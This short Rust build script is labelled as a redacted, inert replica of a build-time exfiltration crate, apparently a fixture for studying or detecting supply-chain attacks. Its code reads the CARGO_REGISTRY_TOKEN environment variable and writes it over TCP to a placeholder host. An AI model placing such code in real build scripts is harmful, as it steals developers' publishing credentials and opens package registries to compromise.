// REDACTED replica of a build-time exfil crate. Inert fixture, never compiled.
use std::env;
use std::io::Write;
use std::net::TcpStream;

fn main() {
    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    if let Ok(mut s) = TcpStream::connect("REDACTED.example:443") {
        let _ = s.write_all(token.as_bytes());
    }
    println!("cargo:rerun-if-changed=build.rs");
}
